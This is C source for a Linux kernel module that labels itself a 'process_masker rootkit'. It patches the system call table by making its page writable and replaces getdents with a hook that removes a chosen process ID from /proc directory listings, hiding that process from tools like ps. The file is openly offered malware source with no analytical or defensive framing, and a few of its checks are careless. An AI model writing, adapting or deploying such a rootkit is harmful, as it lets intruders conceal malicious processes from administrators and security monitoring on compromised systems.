#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/syscalls.h>
#include <asm/errno.h>
#include <asm/unistd.h>
#include <linux/mman.h>
#include <asm/proto.h>
#include <asm/delay.h>
#include <linux/init.h>
#include <linux/highmem.h>
#include <linux/sched.h>
#include <linux/namei.h>	/* Needed for kern_path & LOOKUP_FOLLOW */
#include "intercept.h"

asmlinkage int (*real_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);

char * table_ptr;
int pid;
module_param(table_ptr, charp, S_IRUGO);
module_param(pid, int, S_IRUGO);

void **syscall_table;
unsigned long proc_ino;

/* Function that gets the inode number of the file found under specified path */
unsigned long get_inode_no(char *path_name)
{
	unsigned long inode_no;
	struct path path;
	struct inode *inode;

	inode_no = -1;

    	kern_path(path_name, LOOKUP_FOLLOW, &path);
    	inode = path.dentry->d_inode;
	inode_no = inode->i_ino;

	return inode_no;
}

/* Function that replaces the original getdents syscall. In addition to what
   getdents does, additionally it ...  */
asmlinkage int my_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
	int nread;
	int nread_temp;
	int read_pid;
	char *endptr;

	/* Call original getdents_syscall */
	nread = real_getdents(fd, dirp, count);

	if (dirp->d_ino != proc_ino)
		return nread;

	nread_temp = nread;

	while (nread_temp > 0) {
		nread_temp -= dirp->d_reclen;

		read_pid = simple_strtol(dirp->d_name, &endptr, 10);
		if (read_pid && pid==read_pid) {
			printk(KERN_INFO "INTERCEPT: process_masker rootkit: hiding PID %d\n", pid);
			memmove(dirp, (char *) dirp + dirp->d_reclen, nread_temp);
			nread -= dirp->d_reclen;
			continue;
		}

		if (nread_temp == 0)
			return nread;

		dirp = (struct linux_dirent *) ((char *) dirp + dirp->d_reclen);
	}

	return nread;
}

int __init chdir_init(void){
	unsigned int l;
	proc_ino = get_inode_no("/proc");
	if (proc_ino < 0)
		return 1;
	pte_t *pte;
	kstrtoul(table_ptr, 16, (long unsigned int *)&syscall_table);
	pte = lookup_address((long unsigned int)syscall_table,&l);
	pte->pte |= _PAGE_RW;
	real_getdents = syscall_table[__NR_getdents];
	syscall_table[__NR_getdents] = my_getdents_syscall;
	printk("Patched!\nOLD :%p\nIN-TABLE:%p\nNEW:%p\n", real_getdents, syscall_table[__NR_getdents],my_getdents_syscall);
	return 0;
}

void __exit chdir_cleanup(void){
	unsigned int l;
	pte_t *pte;
	syscall_table[__NR_getdents] = real_getdents;
	pte = lookup_address((long unsigned int)syscall_table,&l);
	pte->pte &= ~_PAGE_RW;
	printk("Exit\n");
	return;
}

module_init(chdir_init);
module_exit(chdir_cleanup);
MODULE_LICENSE("GPL");

